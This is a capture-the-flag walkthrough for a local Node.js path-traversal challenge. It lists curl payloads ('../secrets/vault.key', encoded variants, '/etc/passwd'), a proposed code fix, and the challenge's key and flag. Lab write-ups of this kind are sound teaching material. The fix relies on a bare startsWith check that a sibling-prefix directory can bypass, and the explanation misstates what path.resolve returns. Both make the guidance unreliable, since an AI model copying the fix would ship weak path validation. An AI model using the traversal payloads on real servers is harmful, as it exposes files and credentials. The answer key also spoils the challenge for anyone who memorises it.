# Complete Solution Guide: Money Heist CTF

This guide provides step-by-step instructions with all necessary commands to solve the CTF challenge.

---

## Prerequisites

- Access to the CTF web application (URL provided by instructor)
- `curl` command-line tool (or browser with DevTools)
- Basic understanding of path traversal vulnerabilities

---

## Stage 1: Exploit the Vulnerability to Find the Key

### Step 1: Initial Exploration

**1.1 Check the application is running:**
```bash
curl http://localhost:5101/health
```

**Expected output:**
```json
{"ok":true,"secure":false}
```

**1.2 Visit the main page:**
```bash
curl http://localhost:5101/
```

**1.3 Test legitimate file download:**
```bash
curl http://localhost:5101/download?file=heist.log
```

**Expected output:** Log file content from The Professor

---

### Step 2: Discover Source Code

**2.1 Check robots.txt for hints:**
```bash
curl http://localhost:5101/robots.txt
```

**Expected output:**
```
User-agent: *
Disallow: /vault/
Disallow: /source/
# Source code is hidden but accessible if you know where to look
```

**2.2 List available source files:**
```bash
curl http://localhost:5101/source
```

**Expected output:**
```json
{"message":"Source files available","files":["challenge_info.md","server.js","safePath.js"]}
```

**2.3 Read the challenge information:**
```bash
curl http://localhost:5101/source/challenge_info
```

**2.4 Read the vulnerable code:**
```bash
curl http://localhost:5101/source/safePath.js
```

**Expected output:**
```javascript
const path = require("path");

/**
 * TODO (player): Fix path traversal.
 *
 * Requirements:
 * - Only allow access to files inside logsDir
 * - Block:
 *   - ../ and ..\
 *   - absolute paths
 *   - url-encoded traversal (treat input as-is)
 * - Allow typical log filenames like "heist.log"
 */
function safeJoinLogsPath(logsDir, userFile) {
  // VULNERABLE: naive join
  return path.join(logsDir, userFile);
}

module.exports = { safeJoinLogsPath };
```

**2.5 Read server.js to understand the flow:**
```bash
curl http://localhost:5101/source/server.js
```

---

### Step 3: Exploit Path Traversal to Get the Key

**3.1 Attempt basic path traversal:**
```bash
curl http://localhost:5101/download?file=../secrets/vault.key
```

**Expected output:**
```
RDxlT2USNk6yFo1Ejmenl1tkrJ4vGz9T2YKrqOQT
```

**✅ Stage 1 Complete!** You've found the key: `RDxlT2USNk6yFo1Ejmenl1tkrJ4vGz9T2YKrqOQT`

**3.2 (Optional) Test other traversal vectors:**
```bash
# Windows-style traversal
curl "http://localhost:5101/download?file=..\secrets\vault.key"

# URL-encoded traversal
curl "http://localhost:5101/download?file=..%2Fsecrets%2Fvault.key"

# Absolute path (should also work with vulnerable code)
curl "http://localhost:5101/download?file=/etc/passwd"
```

---

## Stage 2: Fix the Vulnerability and Get the Flag

### Step 4: Understand the Fix Required

The vulnerable code uses `path.join()` which doesn't prevent directory traversal. We need to:
1. Use `path.resolve()` to get absolute paths
2. Validate that the resolved path stays within the base directory
3. Throw an error if traversal is detected

### Step 5: Create the Fixed Code

**5.1 The correct implementation:**

Create a file with the fixed code (or prepare it in your text editor):

```javascript
const path = require("path");

function safeJoinLogsPath(logsDir, userFile) {
  // Resolve both paths to absolute paths
  const resolved = path.resolve(logsDir, userFile);
  const baseDir = path.resolve(logsDir);
  
  // Ensure resolved path is within baseDir
  if (!resolved.startsWith(baseDir)) {
    throw new Error("Path traversal blocked");
  }
  
  return resolved;
}

module.exports = { safeJoinLogsPath };
```

**Explanation:**
- `path.resolve(logsDir, userFile)` normalizes and resolves all `../` sequences to an absolute path
- `path.resolve(logsDir)` gets the absolute base directory
- `resolved.startsWith(baseDir)` ensures the final path cannot escape the base directory
- Throws an error if traversal is attempted

---

### Step 6: Submit the Fixed Code

**6.1 Submit via POST /submit endpoint:**

**Using curl (Linux/Mac):**
```bash
curl -X POST http://localhost:5101/submit \
  -H "Content-Type: text/plain" \
  --data-binary @- << 'EOF'
const path = require("path");

function safeJoinLogsPath(logsDir, userFile) {
  const resolved = path.resolve(logsDir, userFile);
  const baseDir = path.resolve(logsDir);
  
  if (!resolved.startsWith(baseDir)) {
    throw new Error("Path traversal blocked");
  }
  
  return resolved;
}

module.exports = { safeJoinLogsPath };
EOF
```

**Alternative: Save to file and submit:**
```bash
# Create the fixed code file
cat > fixed_safePath.js << 'EOF'
const path = require("path");

function safeJoinLogsPath(logsDir, userFile) {
  const resolved = path.resolve(logsDir, userFile);
  const baseDir = path.resolve(logsDir);
  
  if (!resolved.startsWith(baseDir)) {
    throw new Error("Path traversal blocked");
  }
  
  return resolved;
}

module.exports = { safeJoinLogsPath };
EOF

# Submit the file
curl -X POST http://localhost:5101/submit \
  -H "Content-Type: text/plain" \
  --data-binary @fixed_safePath.js
```

**Using PowerShell (Windows):**
```powershell
$code = @"
const path = require("path");

function safeJoinLogsPath(logsDir, userFile) {
  const resolved = path.resolve(logsDir, userFile);
  const baseDir = path.resolve(logsDir);
  
  if (!resolved.startsWith(baseDir)) {
    throw new Error("Path traversal blocked");
  }
  
  return resolved;
}

module.exports = { safeJoinLogsPath };
"@

Invoke-RestMethod -Uri "http://localhost:5101/submit" -Method Post -Body $code -ContentType "text/plain"
```

**Expected output (success):**
```json
{
  "success": true,
  "message": "Code submitted successfully! The fix has been applied and validated.",
  "secure": true,
  "hint": "Try accessing /vault/key now!"
}
```

**If you get an error:**
- Check that your code includes `const path = require("path");`
- Ensure `module.exports = { safeJoinLogsPath };` is present
- Verify the function signature matches exactly

---

### Step 7: Verify the Fix

**7.1 Check health status:**
```bash
curl http://localhost:5101/health
```

**Expected output:**
```json
{"ok":true,"secure":true}
```

**7.2 Test legitimate file access (should work):**
```bash
curl http://localhost:5101/download?file=heist.log
```

**Expected output:** Log file content (should still work)

**7.3 Test path traversal (should be blocked):**
```bash
curl http://localhost:5101/download?file=../secrets/vault.key
```

**Expected output:**
```
blocked
```

**7.4 Test URL-encoded traversal (should be blocked):**
```bash
curl "http://localhost:5101/download?file=..%2Fsecrets%2Fvault.key"
```

**Expected output:**
```
blocked
```

**7.5 Test absolute path (should be blocked):**
```bash
curl "http://localhost:5101/download?file=/etc/passwd"
```

**Expected output:**
```
blocked
```

---

### Step 8: Retrieve the Flag

**8.1 Access the vault:**
```bash
curl http://localhost:5101/vault/key
```

**Expected output:**
```
TDHCTF{BELLA_CIAO_NO_MORE_DOT_DOT_SLASH}
```

**✅ Stage 2 Complete!** You've retrieved the flag: `TDHCTF{BELLA_CIAO_NO_MORE_DOT_DOT_SLASH}`

---

## Complete Command Sequence (Quick Reference)

Here's the complete sequence of commands in order:

```bash
# Stage 1: Find the Key
curl http://localhost:5101/health
curl http://localhost:5101/robots.txt
curl http://localhost:5101/source
curl http://localhost:5101/source/safePath.js
curl http://localhost:5101/download?file=../secrets/vault.key

# Stage 2: Fix and Get Flag
curl -X POST http://localhost:5101/submit \
  -H "Content-Type: text/plain" \
  --data-binary @- << 'EOF'
const path = require("path");

function safeJoinLogsPath(logsDir, userFile) {
  const resolved = path.resolve(logsDir, userFile);
  const baseDir = path.resolve(logsDir);
  
  if (!resolved.startsWith(baseDir)) {
    throw new Error("Path traversal blocked");
  }
  
  return resolved;
}

module.exports = { safeJoinLogsPath };
EOF

# Verify
curl http://localhost:5101/health
curl http://localhost:5101/download?file=../secrets/vault.key
curl http://localhost:5101/vault/key
```

---

## Troubleshooting

### Issue: Submission returns "Code submitted, but path traversal is not blocked"

**Solution:** Ensure your code throws an error when traversal is attempted. The validation checks that `../secrets/vault.key` throws an error.

**Check:**
- Does your code use `path.resolve()`?
- Does it compare paths using `startsWith()`?
- Does it throw an error when paths don't match?

### Issue: Submission returns "No code provided"

**Solution:** Ensure you're sending the code in the request body with correct Content-Type.

**For curl:**
```bash
curl -X POST http://localhost:5101/submit \
  -H "Content-Type: text/plain" \
  -d "$(cat fixed_safePath.js)"
```

### Issue: Legitimate files don't work after fix

**Solution:** Ensure your code still returns the resolved path for legitimate files. The function should:
1. Resolve the path
2. Check it's within baseDir
3. Return the resolved path (not throw)

### Issue: Health shows secure=false after submission

**Solution:** The validation might have failed. Check:
- Your code syntax is correct
- The function is exported correctly
- The function throws errors for traversal attempts
- The function returns paths for legitimate files

---

## Understanding the Solution

### Why `path.join()` is vulnerable:
```javascript
path.join('/app/data/logs', '../secrets/vault.key')
// Result: '/app/data/secrets/vault.key'  ← Escaped!
```

### Why `path.resolve()` + validation works:
```javascript
const resolved = path.resolve('/app/data/logs', '../secrets/vault.key');
// Result: '/app/secrets/vault.key'  ← Absolute path

const baseDir = path.resolve('/app/data/logs');
// Result: '/app/data/logs'  ← Absolute base

resolved.startsWith(baseDir)  // false → Blocked!
```

### Key Security Principles:
1. **Never trust user input** - Always validate paths
2. **Resolve to absolute paths** - Makes comparison reliable
3. **Fail securely** - Block by default, allow only validated paths
4. **Test thoroughly** - Verify both positive and negative cases

---

## Summary

**Stage 1 - Key Found:**
- Exploited path traversal vulnerability
- Retrieved key: `RDxlT2USNk6yFo1Ejmenl1tkrJ4vGz9T2YKrqOQT`

**Stage 2 - Flag Retrieved:**
- Fixed the vulnerability using `path.resolve()` and path validation
- Verified the fix blocks all traversal attempts
- Retrieved flag: `TDHCTF{BELLA_CIAO_NO_MORE_DOT_DOT_SLASH}`

**What You Learned:**
- Path traversal vulnerabilities and how they work
- Secure path handling in Node.js
- Input validation and security testing
- Defense-in-depth principles

---

**Congratulations on completing the challenge!** 🎉

